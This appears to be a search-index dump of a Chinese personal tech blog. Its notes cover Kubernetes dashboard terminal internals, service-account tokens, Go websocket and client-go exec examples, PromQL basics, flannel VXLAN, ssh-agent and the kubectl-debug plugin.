[{"categories":null,"content":"SoulChild's friends","date":"2023-01-13 12:56","objectID":"/friends/","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":null,"content":"离线 - SoulChild随笔记","date":"0001-01-01 00:00","objectID":"/offline/","tags":null,"title":"","uri":"/offline/"},{"categories":["其他"],"content":"图标生成 https://realfavicongenerator.net/ 问题检测 https://www.pwabuilder.com/reportcard?site=https://soulchild.cn ","date":"2023-01-13 15:34","objectID":"/post/pwa%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/:0:0","tags":["hugo"],"title":"Pwa在线工具网站","uri":"/post/pwa%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/"},{"categories":["kubernetes","云原生","golang"],"content":"源码位置 前端实现 https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/frontend/shell/template.html https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/frontend/shell/component.ts 后端实现 入口有两个 sockjs连接实现 https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/backend/dashboard.go 访问终端界面时的handler https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/backend/handler/apihandler.go 主要逻辑 https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/backend/handler/terminal.go ","date":"2022-12-20 23:48","objectID":"/post/2950/:0:1","tags":["k8s","go"],"title":"k8s dashboard terminal源码分析","uri":"/post/2950/"},{"categories":["kubernetes","云原生","golang"],"content":"源码分析 一、socket部分 首先通过入口开始定位，慢慢把流程串起来. 通过浏览器可以定位到web terminal使用了websocket进行的通信，对话内容也可以记一下，这个顺序也有些用。 21078-lkwsyb278wc.png 在源码中找到api路由/api/sockjs/491/jv0og3kn/websocket?29677d05b2b2932b300380c0cc0dcaf4 源码位置 https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/backend/dashboard.go#L170 这里可以看出来/api/sockjs/开头的路由都交给了handler.CreateAttachHandler(\"/api/sockjs\")函数处理 这个函数很简单就一句return sockjs.NewHandler(path, sockjs.DefaultOptions, handleTerminalSession) /api/sockjs这个路由最终的处理函数是handleTerminalSession，这个函数接收sockjs.Session类型参数，通过他可以读取websocket会话的消息。 这个函数前面做了一些判断err，msg变量是TerminalMessage结构体实例化出来的，主要应该用来反序列化客户端传来的消息为结构体对象的，后面两个，如果建立会话后发送的内容中msg.Op不是bind就直接return，下面会判断msg中的sessionID是否存在于terminalSessions中，不存在的sessionID也会return(什么时候将sessionID存入terminalSessions中的?在另一个入口中，后面会说到【1】) 18297-49vtn04vmhj.png 再往下，第一行是将sockjs.Session对象存入sockJSSession中，第二行是将sockjs.Session对象存入SessionMap中, sockjs.Session对象可以用来发送和接受数据 第三行的bound是个err类型的channel，将nil放进去, 执行完应该会阻塞，由后面的WaitForTerminal函数来消费处理 83390-yukzu4wykv8.png 这里使用了TerminalSession结构体，terminalSession变量是在当前函数体内声明的，我没截出来。 // 这里是实例化StreamOptions需要用的一些参数，stream通过read、write方法将服务端的stdout、stdin、stderr、写入到指定的位置，具体写到哪可以看下面的实现逻辑 type PtyHandler interface { io.Reader io.Writer remotecommand.TerminalSizeQueue // 终端大小，也是stream需要的option } // TerminalSession implements PtyHandler (using a SockJS connection) type TerminalSession struct { id string bound chan error sockJSSession sockjs.Session sizeChan chan remotecommand.TerminalSize // 这个结构体就两个属性宽和高 } // 和客户端发的消息格式对应，格式不一致就无法反序列化，从而无法建立连接 type TerminalMessage struct { Op, Data, SessionID string Rows, Cols uint16 } // 主要用来存储sessionId和session的对应关系的，通过get、set方法可以读取和设置 type SessionMap struct { Sessions map[string]TerminalSession Lock sync.RWMutex } 注释中说TerminalSession实现了PtyHandler接口，并且他还拥有SockJS session对象信息，PtyHandler接口继承了io.Reader、io.Writer、remotecommand.TerminalSizeQueue，只要实现下面三个方法即可 read 读取客户端发来的数据 write 向客户端发送数据 next 获取终端大小，返回给调用方 看看他实现这些方法的逻辑 // Read方法将终端大小存入到channel中了，这个方法从channel中读出来并将结果返回 func (t TerminalSession) Next() *remotecommand.TerminalSize { size := \u003c-t.sizeChan if size.Height == 0 \u0026\u0026 size.Width == 0 { return nil } return \u0026size } func (t TerminalSession) Read(p []byte) (int, error) { m, err := t.sockJSSession.Recv() // 读取客户端的数据 if err != nil { // Send terminated signal to process to avoid resource leak return copy(p, END_OF_TRANSMISSION), err // 如果读取异常则return一个终止传输的符号(\\u0004-EOT) } var msg TerminalMessage if err := json.Unmarshal([]byte(m), \u0026msg); err != nil { return copy(p, END_OF_TRANSMISSION), err } switch msg.Op { // 成功读取数据后,需要根据数据中的Op属性，判断要进行的动作 case \"stdin\": return copy(p, msg.Data), nil case \"resize\": // 实例化TerminalSize对象，客户端发来的终端大小放在这个对象里, 将这个对象放入sizeChan中 t.sizeChan \u003c- remotecommand.TerminalSize{Width: msg.Cols, Height: msg.Rows} return 0, nil default: return copy(p, END_OF_TRANSMISSION), fmt.Errorf(\"unknown message type '%s'\", msg.Op) // 未知的Op属性，返回终止传输符号，同时返回错误信息 } } // 对数据序列化进行然后发送给客户端，类型是stdout func (t TerminalSession) Write(p []byte) (int, error) { msg, err := json.Marshal(TerminalMessage{ Op: \"stdout\", Data: string(p), }) if err != nil { return 0, err } if err = t.sockJSSession.Send(string(msg)); err != nil { return 0, err } return len(p), nil } // 发送类型为OOB的消息，暂时不管，可能适用于扩展警告信息等 func (t TerminalSession) Toast(p string) error { msg, err := json.Marshal(TerminalMessage{ Op: \"toast\", Data: p, }) if err != nil { return err } if err = t.sockJSSession.Send(string(msg)); err != nil { return err } return nil } 小总结 客户端发送/api/sockjs/xxxx后会执行handleTerminalSession函数进行初始化，验证连接的合法性，如果合法将websocket的session存入sessionMap中，最后向bound这个channel中放入nil，通知另一个函数当前连接已就绪 二、apiserver交互部分 当进入这个页面的时候，它会发送一个请求，服务端会返回一个id 54674-jgv8dqlhzi.png 53512-olpqyd97ujr.png 后端处理逻辑分析，首先定位到它的handler是handleExecShell 72415-nvk4u09b4cs.png 源码如下 // Handles execute shell API call func (apiHandler *APIHandler) handleExecShell(request *restful.Request, response *restful.Response) { sessionID, err := genTerminalSessionId() // 这里调用了genTerminalSessionId函数，随机生成一个ID if err != nil { errors.HandleInternalErro","date":"2022-12-20 23:48","objectID":"/post/2950/:0:2","tags":["k8s","go"],"title":"k8s dashboard terminal源码分析","uri":"/post/2950/"},{"categories":["kubernetes","云原生","golang"],"content":"功能拆解例子 代码量明显减少，方便阅读 https://github.com/SoulChildTc/k8s-web-terminal-learn ","date":"2022-12-20 23:48","objectID":"/post/2950/:0:3","tags":["k8s","go"],"title":"k8s dashboard terminal源码分析","uri":"/post/2950/"},{"categories":["kubernetes"],"content":"果然两天不看就跟不上了，我的集群版本是1.25.3，今天需要用token来做些事情，创建serviceAccount的时候发现没有生成secret，查了一下发现从1.24开始就不会自动生成secret了，chanagelog在这里. 内容如下 LegacyServiceAccountTokenNoAutoGeneration 功能门是测试版，默认启用。启用后，不再为每个 ServiceAccount 自动生成包含服务帐户令牌的 Secret API 对象。使用 TokenRequest API 获取服务帐户令牌，或者如果需要未过期的令牌，请按照本指南为令牌控制器创建一个 Secret API 对象以填充服务帐户令牌 pr: https://github.com/kubernetes/kubernetes/pull/108309 在上面提到的两种方式要怎么用呢 方式1 使用TokenRequest API来生成token，获取方式如下 使用client-go或者其他api调用工具来获取某个serviceaccount的token 创建yaml，使用kubectl apply -f 使用kubectl create token -n xxx \u003cserviceaccount-name\u003e来获取一个临时的token,默认1小时 方式2 创建secret token，创建后从secret的token字段拿就可以了 apiVersion: v1 kind: Secret metadata: name: secret-sa-sample annotations: kubernetes.io/service-account.name: \"sa-name\" # 这里填写serviceAccountName type: kubernetes.io/service-account-token ","date":"2022-12-17 13:25","objectID":"/post/2945/:0:0","tags":["k8s"],"title":"k8s serviceaccount创建后没有生成对应的secret","uri":"/post/2945/"},{"categories":["golang"],"content":"参考: https://hoohoo.top/blog/20220320172715-go-websocket/ 关于客户端部分使用 chrome 扩展：Websocket King。 在线版: https://websocketking.com/ ","date":"2022-12-16 23:51","objectID":"/post/2942/:0:0","tags":["gin"],"title":"Gin+Gorilla构建一个简单的websocket服务端","uri":"/post/2942/"},{"categories":["golang"],"content":"安装module go get github.com/gin-gonic/gin go get github.com/gorilla/websocket ","date":"2022-12-16 23:51","objectID":"/post/2942/:0:1","tags":["gin"],"title":"Gin+Gorilla构建一个简单的websocket服务端","uri":"/post/2942/"},{"categories":["golang"],"content":"构建一个 websocket 服务器 以下是使用 gin 和 gorilla 构建的简单 websocket 服务器的示例，Gin 创建一个 get 请求，并通过 upgrade.Upgrade 将这个 HTTP 连接升级为 websocket 连接。 可以使用具有以下参数的 websocket.Upgrader： HandshakeTimeout：指定握手完成的超时时间。 ReadBufferSize 和 WriteBufferSize：以字节为单位指定 I/O 缓冲区大小，这不会限制发送消息的大小。 WriteBufferPool：用于写操作的缓冲区池, 缓冲区可以使用后被重用，从而减少内存分配和回收的开销。 Subprotocols：指定服务器支持的子协议列表，按照顺序来协商使用哪个，比如chat，jsonrpc，soap，xmpp等等。 Error：http升级到websocket发生错误时的处理函数，可以以http的方式响应回去 CheckOrigin: 可以进行鉴权之类的操作，不符合条件的不允许建立websocket连接 EnableCompression：指定服务器是否应该尝试协商每个消息的压缩(RFC 7692)。 package main import ( \"fmt\" \"github.com/gin-gonic/gin\" \"github.com/gorilla/websocket\" \"net/http\" \"time\" ) var upgrader = websocket.Upgrader{ HandshakeTimeout: time.Second * 3, ReadBufferSize: 4096, WriteBufferSize: 4096, Error: func(w http.ResponseWriter, r *http.Request, status int, reason error) { fmt.Printf(\"升级连接发生错误: %v\", reason) http.Error(w, http.StatusText(status), status) _, err := w.Write([]byte(\"升级连接发生错误\")) if err != nil { fmt.Printf(\"写入response失败: %v\", reason) } }, CheckOrigin: func(r *http.Request) bool { return r.Header[\"Origin\"][0] == \"chrome-extension://cbcbkhdmedgianpaifchdaddpnmgnknn\" }, EnableCompression: true, } func main() { r := gin.Default() r.GET(\"/\", func(c *gin.Context) { // 将get请求升级成websocket协议 ws, err := upgrader.Upgrade(c.Writer, c.Request, nil) if err != nil { fmt.Println(err) return } defer ws.Close() for { // 读取message消息 mt, message, err := ws.ReadMessage() if err != nil { fmt.Println(err) break } // 如果客户端发来ping,我们就回复pong if string(message) == \"ping\" { message = []byte(\"pong\") } // 响应消息到客户端 err = ws.WriteMessage(mt, message) if err != nil { fmt.Println(err) break } } }) r.Run() // listen and serve on 0.0.0.0:8080 } 52939-uby3y8n9nn8.png 通过http访问 81660-uibkq6q5ft.png ","date":"2022-12-16 23:51","objectID":"/post/2942/:0:2","tags":["gin"],"title":"Gin+Gorilla构建一个简单的websocket服务端","uri":"/post/2942/"},{"categories":["kubernetes","golang"],"content":"kubectl exec源码实现: https://github.com/kubernetes/kubernetes/blob/release-1.25/staging/src/k8s.io/kubectl/pkg/cmd/exec/exec.go package main import ( \"bytes\" \"errors\" \"fmt\" \"github.com/wonderivan/logger\" corev1 \"k8s.io/api/core/v1\" \"k8s.io/client-go/kubernetes\" \"k8s.io/client-go/kubernetes/scheme\" \"k8s.io/client-go/rest\" \"k8s.io/client-go/tools/clientcmd\" \"k8s.io/client-go/tools/remotecommand\" ) var K8s k8s type k8s struct { ClientSet *kubernetes.Clientset Config *rest.Config } func (k *k8s) Init() { var err error k.Config, err = clientcmd.BuildConfigFromFlags(\"\", \"./kube-config\") if err != nil { panic(\"kubeConfig解析失败: \" + err.Error()) } // NewForConfig返回一个ClientSet的指针对象，他包含了所有k8s内置的api k.ClientSet, err = kubernetes.NewForConfig(k.Config) if err != nil { panic(\"kubernetes client创建失败: \" + err.Error()) } else { logger.Info(\"kubernetes client初始化成功\") } } func (k *k8s) ExecPod(podName, containerName, namespace string, cmd []string) (stdout bytes.Buffer, stderr bytes.Buffer, err error) { execOpt := \u0026corev1.PodExecOptions{ Stdin: false, Stdout: true, Stderr: true, TTY: false, Container: containerName, Command: cmd, } req := K8s.ClientSet.CoreV1().RESTClient().Post(). Resource(\"pods\"). Name(podName). Namespace(namespace). SubResource(\"exec\"). // 注意这里一定要import \"k8s.io/client-go/kubernetes/scheme\"，而不是\"k8s.io/apimachinery/pkg/apis/meta/internalversion/scheme\" VersionedParams(execOpt, scheme.ParameterCodec) exec, err := remotecommand.NewSPDYExecutor(K8s.Config, \"POST\", req.URL()) if err != nil { fmt.Println(\"NewSPDYExecutor: \" + err.Error()) return stdout, stderr, errors.New(\"NewSPDYExecutor: \" + err.Error()) } err = exec.Stream(remotecommand.StreamOptions{ Stdin: nil, Stdout: \u0026stdout, Stderr: \u0026stderr, Tty: false, }) if err != nil { fmt.Println(\"exec.Stream:\" + err.Error()) return stdout, stderr, errors.New(\"exec.Stream:\" + err.Error()) } //fmt.Println(stdout.String(), stderr.String()) return } func main() { K8s.Init() stdout, stderr, err := K8s.ExecPod( \"busybox-deployment-546c77d55b-p9nhh\", \"busybox\", \"default\", []string{\"hostname\"}) if err != nil { return } fmt.Println(stdout.String(), stderr.String()) } go.mod module go_learn go 1.18 require ( github.com/forgoer/openssl v1.4.0 github.com/wonderivan/logger v1.0.0 k8s.io/api v0.25.3 k8s.io/client-go v0.25.3 ) ","date":"2022-12-16 23:20","objectID":"/post/2940/:0:0","tags":["go","client-go"],"title":"client-go调用exec向容器发送指令","uri":"/post/2940/"},{"categories":["golang"],"content":" package main import ( \"fmt\" ) func main() { /* 切片：s = {30,50,20,10,60,40} 从小到达排序 冒泡排序: i\u003ej，如果成立就交换,否则不变 第一轮 {30,50,20,10,60,40} 第1次. 30\u003e50, 不变 {30,50,20,10,60,40} 第2次. 50\u003e20, 交换 {30,20,50,10,60,40} 第3次. 50\u003e10, 交换 {30,20,10,50,60,40} 第4次. 50\u003e60, 不变 {30,20,10,50,60,40} 第5次. 60\u003e40, 交换 {30,20,10,50,40,60} 第二轮 {30,20,10,50,40,60} 第1次. 30\u003e20, 交换 {20,30,10,50,40,60} 第2次. 30\u003e10, 交换 {20,10,30,50,40,60} 第3次. 30\u003e50, 不变 {20,10,30,50,40,60} 第4次. 50\u003e40, 交换 {20,10,30,40,50,60} 第5次.不比，因为第一次已经确认60最大了 ...进行5轮，len(s) - 1 规律，每i轮的比较次数=len(s) - i */ s := []int{1, 30, 50, 20, 10, 60, 40} // 外层循环控制，需要进行几轮比较, i会经历1,2,3,4,5 for i := 1; i \u003c len(s); i++ { for j := 0; j \u003c len(s)-i; j++ { // 内层循环控制比较几次, j会经历 第1轮 0~len(s)-1=0~5. 第2轮 0~len(s)-2=0~4. 第3轮 0~len(s)-3=0~3...... if s[j] \u003e s[j+1] { swap(s, j, j+1) } } } fmt.Println(s) } func swap(s []int, i, j int) { s[i], s[j] = s[j], s[i] } ","date":"2022-12-12 19:45","objectID":"/post/2939/:0:0","tags":["go"],"title":"go实现切片的冒泡排序","uri":"/post/2939/"},{"categories":["其他","基础内容"],"content":"首先ASCII码因为是一个字节对应一个字符，我们可以按照每8位到对照表里找出对应的内容。但缺点是只有128个字符，而Unicode是一个通用的字符集，他包含了各个国家的字符，目前收录了超过14几万个字符，在Unicode的前128个字符是和ASCII码一样的，所以Unicode兼容ASCII。 Unicode就像是一个超大的密码本，里面的内容就是现实世界的文字对应计算机世界的数字。 比如严=\u003e4E25=\u003e100111000100101，比如a=\u003e0061=\u003e1100001 可以发现很多数字代表着一个字符，在计算机中8位称为1个字节，很显然英文字母a使用1个字节就能表示，而中文严则需要2个字节。 如果这些字符串组合在一起你要怎么区分呢？比如严a，现在给你一串数字1001110001001011100001，由你来解出他对应的内容，我想你是没有办法找出他对应的内容，因为你并不知道这一串数字代表几个字符，如果他是一个字符，那么你在unicode对照表中是找不到他对应的字符的，unicode中没有这个二进制数对应的字符，如果他是两个字符那么要从哪里开始算是第二个字符呢？ 因此我们需要一种协商一种规则，规定该如何存储数据，这样我们就知道该如何进行解码。比如我们定义：每16位(2字节)算一个字符，那么我们在存储数据的时候就需要保证单个字符满足16位的需求，不满足16位在前面补0。比如严=\u003e0100 1110 0010 0101，比如a=\u003e0000 0000 0110 0001，那么我们再次对严a进行解码，组合后也就是01001110001001010000000001100001，我们按照每16位一个字符来算，可以将他拆分为0100111000100101 0000000001100001，这样就可以算出结果了，想看计算过程的可以看下面。那么utf8就是这样的一个规则(实际的规则并不是上面举例的，上面只是为了方便理解。) 计算过程 0100111000100101 =\u003e 16进制 (4e25)=\u003e 严 (unicode对照表：https://www.unicode.org/charts/PDF/U4E00.pdf ) 0000000001100001 =\u003e 16进制(0061) =\u003e a (unicode对照表：https://www.unicode.org/charts/PDF/U0000.pdf ) PS: utf8编码规则https://www.bo56.com/utf8编码规则/ 如果你想证实Unicode的前128个字符是和ASCII码一样的，那么你可以先找到ASCII对照表，随便找一个符号的ASCII值，将这个值转换为16进制，到这里进行查询https://unicode.org/charts/，注意查询的格式需要是\\uxxxx，不足4位用0补，进入他给你的pdf中搜索你的16进制数，看其对应的符号即可。 参考 https://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html ","date":"2022-12-02 01:06","objectID":"/post/2934/:0:0","tags":[],"title":"关于ASCII、Unicode、编码的简单理解","uri":"/post/2934/"},{"categories":["其他"],"content":"好久没发笔记了，发点存货(●ˇ∀ˇ●) ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:0","tags":["prometheus","promql"],"title":"promql基本概念(一)","uri":"/post/2920/"},{"categories":["其他"],"content":"瞬时向量 一组时间序列，每一个时间序列包含一个样本，所有时间序列共享一个时间点。 比如http_requests_total指标 42009-exx1t4nz5w.png 红框内的算一组时间序列(所有时间序列)，每一行算一个时间序列，每一个时间序列都有自己的value即样本。 所有时间序列共享一个时间点是什么意思呢? 可以看到上面的一组时间序列的时间点都是2022-07-18 21:12:15的。 ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:1","tags":["prometheus","promql"],"title":"promql基本概念(一)","uri":"/post/2920/"},{"categories":["其他"],"content":"范围向量 一组时间序列，每个时间序列包含N个样本数据(随时间变化的) 还是拿http_requests_total指标举例 46134-6267onrxtjw.png 可以看到我们在最后加了[1m],即http_requests_total[1m]什么意思呢? 获取每个时间序列过去1分钟内的所有样本和对它应的时间，因为没有指定时间，所以默认就是当前时间，含义就是当前时间-1m这个时间范围的数据。可以看到这样结果和瞬时向量有很大的区别，这种数据就是范围向量了。为什么一个时间序列只有4个样本数据呢？因为15秒收集一次，1分钟刚好4个。 ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:2","tags":["prometheus","promql"],"title":"promql基本概念(一)","uri":"/post/2920/"},{"categories":["其他"],"content":"标量 就是简单的数字、浮点型数据 ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:3","tags":["prometheus","promql"],"title":"promql基本概念(一)","uri":"/post/2920/"},{"categories":["其他"],"content":"Offset修饰符 用于修改瞬时向量、范围向量的时间偏移量。 举个例子 http_requests_total offset 1m 33556-8u1smsk7a1e.png 正常情况下我们查询是当前时间, 加了offset 1m后就代表当前时间减1m。这里和[1m]不一样的是,[1m]的查询结果是范围向量，而offset 1m的结果是不会变的，他还是瞬时向量，最终他的含义就是获取1分钟前的时间点的样本数据 在举一个例子 http_requests_total[1m] offset 2m 78122-gb5xr85alv4.png 首先看结果他肯定是一个范围向量，先不看offset 2m，先看http_requests_total[1m]他的含义是获取当前时间-1m到当前时间的数据。offset做了什么呢? 其实他就是把当前时间修改了，也就是当前时间-2m，最终含义就变成了: 获取(当前时间-2m)-1m到当前时间-2m的数据 offset还可以指定负数，也就是将时间点偏移到未来，这个的使用场景我只能想到是在指定了查询时间的情况下，比如(http_requests_total{job=\"RabbitMQ\"} offset -1d) - (http_requests_total{job=\"RabbitMQ\"} offset 1d) 06983-4wset9fq927.png 将这个式子想象成一个线段，这将以2022-07-15 00:00:00为中点，用右边的值减去左边的值就是中间区域的值了，最终计算出14号到16号的请求数。 44501-fblz2hr0ds9.png 注意使用负偏移需要开启参数–enable-feature=promql-negative-offset ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:4","tags":["prometheus","promql"],"title":"promql基本概念(一)","uri":"/post/2920/"},{"categories":["其他"],"content":"@ 修饰符 用来设置查询值的时间，比如http_requests_total @ 1609746000查询2021年1月4日 15点40的值。 一般情况下用api查询就足够了，query API可以指定time参数，query_range API可以指定start、end参数。 如果想要使用@修饰符需要启用--enable-feature=promql-at-modifier ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:5","tags":["prometheus","promql"],"title":"promql基本概念(一)","uri":"/post/2920/"},{"categories":["前端"],"content":"作者：veryCold 链接：https://juejin.cn/post/7099718143303483429 来源：稀土掘金 ","date":"2022-11-22 22:27","objectID":"/post/2911/:0:0","tags":["react","nodejs","vue"],"title":"使用moment将UTC时间转本地时间","uri":"/post/2911/"},{"categories":["前端"],"content":"安装 npm install moment --save // npm yarn add moment // Yarn ","date":"2022-11-22 22:27","objectID":"/post/2911/:0:1","tags":["react","nodejs","vue"],"title":"使用moment将UTC时间转本地时间","uri":"/post/2911/"},{"categories":["前端"],"content":"使用 将utc时间转为本地时间 // utils.js import moment from 'moment' ​ // 这里date是后端返回的字符串格式，如：2022-05-13 16:31:53 export function utcToLocal(date) { const fmt = 'YYYY-MM-DD HH:mm:ss' return moment.utc(date).local().format(fmt) } 将本地时间转为utc时间 export function localToUtc(date) { const fmt = 'YYYY-MM-DD HH:mm:ss' return moment(date, fmt).utc().format(fmt) } ","date":"2022-11-22 22:27","objectID":"/post/2911/:0:2","tags":["react","nodejs","vue"],"title":"使用moment将UTC时间转本地时间","uri":"/post/2911/"},{"categories":["kubernetes","云原生"],"content":"环境信息 99837-ha7zzk0habt.png 目标：要访问目标IP为10.244.4.51的POD 首先经过路由表匹配规则10.244.4.0/23 via 10.244.4.0 dev flannel.1 onlink 确定下一跳为10.244.4.0(目标POD所属Node上flannel.1的IP) 通过arp表可以找到目标pod所在节点的flannel.1网卡的MAC地址(对端VTEP设备的MAC)arp -an | grep 10.244.4.0 =\u003e be:85:93:2a:37:68 内核封装数据帧，源MAC是当前flannel.1的，目标MAC是对端flannel.1的 紧接着内核会对这个数据帧添加vxlan报头，VNI为1 flannel.1将数据帧封装成UDP报文,通过FDB表根据MAC查找目标IP。bridge fdb show | grep be:85:93:2a:37:68 =\u003e 192.168.124.104 UDP报文的源IP是ip -d link show flannel.1 | grep -o 'vxlan.*eth.' =\u003e 192.168.124.103，目标IP上面已经获取了，目标端口是8472 在往后就是系统正常的封装了，UDP会被封装在IP报文里，IP报文会被封装在数据帧里，最终通过bit流传送到Node2 Node2的收到数据进行解封装，到达8472端口，交由内核中的VXLAN模块处理(此时处理的是vxlan报文) VXLAN模块会比较这个vxlan报头中的VNI和本机的VTEP设备(flannel.1)的VNI是否一致，然后比较内部数据帧中的目的MAC地址与本机的flannel.1是否一致，都没问题后，将vxlan报头和内部数据帧拆掉，将内部数据包通过flannel.1发出 通过路由表得知发往10.244.4.0/23网段的数据包要走cni0，cni0将数据包发往最终的pod对应的veth pair设备 ","date":"2022-11-17 23:40","objectID":"/post/2908/:0:0","tags":["k8s","flannel","vxlan"],"title":"flannel vxlan模式通信简读","uri":"/post/2908/"},{"categories":["基础内容"],"content":"执行测试 1.首先我们直接运行ssh-agent,可以看到如下效果 70201-ri3g9z9reom.png 2.当我们执行ssh-add时，提示如下 15128-30bmqpdy82.png ssh-add会通过SSH_AUTH_SOCK环境变量，获取与ssh-agent通信的unix套接字,所以我们下面需要设置最开始提示的环境变量。 https://www.ssh.com/academy/ssh/agent#starting-ssh-agent 3.配置环境变量测试 SSH_AUTH_SOCK=/tmp/ssh-8DzA6Dlx4wHO/agent.10547; export SSH_AUTH_SOCK; ssh-add 27709-ybdyc76azv.png 可以看到已经可以使用了，在第一次执行命令的结果中，还有一个SSH_AGENT_PID环境变量，这个是ssh-agent的进程ID,使用ssh-agent -k可以用来退出代理程序。 通过上面的测试发现，只要我们的环境变量配置好正确的unix套接字，就可以使用ssh-agent了，但是每次都这样配置太麻烦了。 ","date":"2022-09-13 15:02","objectID":"/post/2893/:0:1","tags":["shell"],"title":"关于为什么ssh-agent需要使用eval来运行","uri":"/post/2893/"},{"categories":["基础内容"],"content":"为什么ssh-agent不帮我们设置环境变量呢? 这其实和linux操作系统有关，因为ssh-agent是作为当前shell的一个子进程运行的。在linux中，进程只能修改自己的环境变量，并将它们传递给子进程。但它不能修改其父进程的环境变量，因为系统不允许。 https://unix.stackexchange.com/questions/351725/why-eval-the-output-of-ssh-agent ","date":"2022-09-13 15:02","objectID":"/post/2893/:0:2","tags":["shell"],"title":"关于为什么ssh-agent需要使用eval来运行","uri":"/post/2893/"},{"categories":["基础内容"],"content":"使用eval解决 eval可以将字符串作为命令来执行，在我们直接执行ssh-agent时，屏幕会输出三行内容，这三行内容就是三条命令，所以我们可以将ssh-agent的执行结果在当前Shell作为命令执行，那么你可以看下下面这个命令，是不是很合理 eval $(ssh-agent) 04505-0zvqsslretxa.png 首先执行ssh-agent，输出的结果是三行命令，通过eval来执行这三行命令，就达到了自动添加环境变量的目的.因为第三行是一个echo命令，所以将pid输出了出来。 ","date":"2022-09-13 15:02","objectID":"/post/2893/:0:3","tags":["shell"],"title":"关于为什么ssh-agent需要使用eval来运行","uri":"/post/2893/"},{"categories":["其他"],"content":" fatal: git fetch-pack: expected shallow list fatal: The remote end hung up unexpectedly 升级git yum install -y \\ https://repo.ius.io/ius-release-el7.rpm \\ https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm yum install -y git236 ","date":"2022-08-25 15:59","objectID":"/post/2891/:0:0","tags":[],"title":"gitlab ci 拉取代码出现hung up unexpectedly","uri":"/post/2891/"},{"categories":["kubernetes"],"content":"github https://github.com/aylei/kubectl-debug https://github.com/JamesTGrant/kubectl-debug 原作教程 https://aleiwu.com/post/kubectl-debug-intro/ 正如readme中所说 从 kubernetes 1.23开始，临时容器功能处于测试阶段（默认启用） 临时容器功能从 kubernetes 1.16到1.22 处于alpha阶段。在 Kubernetes 中，默认情况下，需要显式启用 alpha 功能（默认情况下不启用alpha功能）。 在老版本的集群中，我们就可以用下面的这种方式来实现kubectl debug ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:0","tags":["k8s"],"title":"kubectl debug - 社区方案","uri":"/post/2878/"},{"categories":["kubernetes"],"content":"一、安装 wget https://github.com/aylei/kubectl-debug/releases/download/v0.1.1/kubectl-debug_0.1.1_linux_amd64.tar.gz tar xf kubectl-debug_0.1.1_linux_amd64.tar.gz chmod +x kubectl-debug mv kubectl-debug /usr/local/bin ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:1","tags":["k8s"],"title":"kubectl debug - 社区方案","uri":"/post/2878/"},{"categories":["kubernetes"],"content":"二、示例 创建测试Pod kubectl run ephemeral-demo --image=registry.aliyuncs.com/google_containers/pause:3.1 --restart=Never 1.简单调试 kubectl debug ephemeral-demo --agentless --port-forward --agent-image=aylei/debug-agent:v0.1.1 如果看到Error: No such image: nicolaka/netshoot:latest这样的错误，需要手动去对应的Node上拉取nicolaka/netshoot:latest镜像。或者使用参数--agent-image=aylei/debug-agent:v0.1.1 访问目标容器的根文件系统: cd /proc/1/root/ 2.fork 排查 CrashLoopBackoff 是一个很麻烦的问题，Pod 可能会不断重启， kubectl exec 和 kubectl debug 都没法稳定进行排查问题，基本上只能寄希望于 Pod 的日志中打印出了有用的信息。 为了让针对 CrashLoopBackoff 的排查更方便， kubectl-debug 参考 oc debug 命令，添加了一个 –fork 参数。当指定 –fork 时，插件会复制当前的 Pod Spec，做一些小修改， 再创建一个新 Pod： 新 Pod 的所有 Labels 会被删掉，避免 Service 将流量导到 fork 出的 Pod 上 新 Pod 的 ReadinessProbe 和 LivnessProbe 也会被移除，避免 kubelet 杀死 Pod 新 Pod 中目标容器（待排障的容器）的启动命令会被改写为sh，避免新 Pod 继续 Crash(这需要目标容器包含sh,上面的例子不行) 接下来，我们就可以在新 Pod 中尝试复现旧 Pod 中导致 Crash 的问题。为了保证操作的一致性，可以先 chroot 到目标容器的根文件系统中 kubectl debug demo-pod --fork chroot /proc/1/root ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:2","tags":["k8s"],"title":"kubectl debug - 社区方案","uri":"/post/2878/"},{"categories":["kubernetes"],"content":"三、安装daemonset agent # kubernetes版本大于等于1.16 kubectl apply -f https://raw.githubusercontent.com/aylei/kubectl-debug/master/scripts/agent_daemonset.yml # kubernetes版本小于v1.16 wget https://raw.githubusercontent.com/aylei/kubectl-debug/master/scripts/agent_daemonset.yml sed -i '' '1s/apps\\/v1/extensions\\/v1beta1/g' agent_daemonset.yml kubectl apply -f agent_daemonset.yml # 使用agent模式 kubectl debug --agentless=false POD_NAME 注意阿里云ack使用的cni terway是不支持hostPort的，所以需要改为hostNetwork或者使用--port-forward参数 最好将yaml中的镜像修改为aylei/debug-agent:v0.1.1 ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:3","tags":["k8s"],"title":"kubectl debug - 社区方案","uri":"/post/2878/"},{"categories":["kubernetes"],"content":"四、配置文件 ~/.kube/debug-config # debug agent listening port(outside container) # default to 10027 agentPort: 10027 # whether using agentless mode # default to true agentless: false # namespace of debug-agent pod, used in agentless mode # default to 'default' agentPodNamespace: default # prefix of debug-agent pod, used in agentless mode # default to 'debug-agent-pod' agentPodNamePrefix: debug-agent-pod # image of debug-agent pod, used in agentless mode # default to 'aylei/debug-agent:latest' agentImage: aylei/debug-agent:v0.1.1 # daemonset name of the debug-agent, used in port-forward # default to 'debug-agent' debugAgentDaemonset: debug-agent # daemonset namespace of the debug-agent, used in port-forwad # default to 'default' debugAgentNamespace: default # whether using port-forward when connecting debug-agent # default true portForward: true # image of the debug container # default as showed image: 